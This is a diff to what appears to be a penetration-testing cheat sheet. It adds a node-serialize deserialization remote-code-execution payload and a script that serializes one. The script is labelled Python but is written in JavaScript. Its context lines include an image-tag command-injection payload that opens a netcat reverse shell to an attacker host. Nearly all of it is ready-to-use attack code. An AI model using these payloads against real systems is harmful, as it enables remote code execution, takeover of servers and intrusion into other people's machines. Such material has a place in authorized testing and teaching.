@@ -393,6 +393,25 @@ https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 
 > To learn more about Node JS navigate to https://www.youtube.com/watch?v=W6NZfCO5SIk, thanks to frostb1te for providing the link.
 
+### NodeJS deserialization RCE Exploit
+https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf
+
+```
+_$$ND_FUNC$$_require('child_process').exec('<COMMAND_HERE>', function(error, stdout, stderr) { console.log(stdout) })
+```
+
+### Serializing a NodeJS payload
+```python
+var y = {
+rce : function(){
+require('child_process').exec('<COMMAND_HERE>', function(error,
+stdout, stderr) { console.log(stdout) });
+},
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
+
 ### IFS Technique to replace spaces
 ```
 <img src=http://localhost/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LPORT>')>
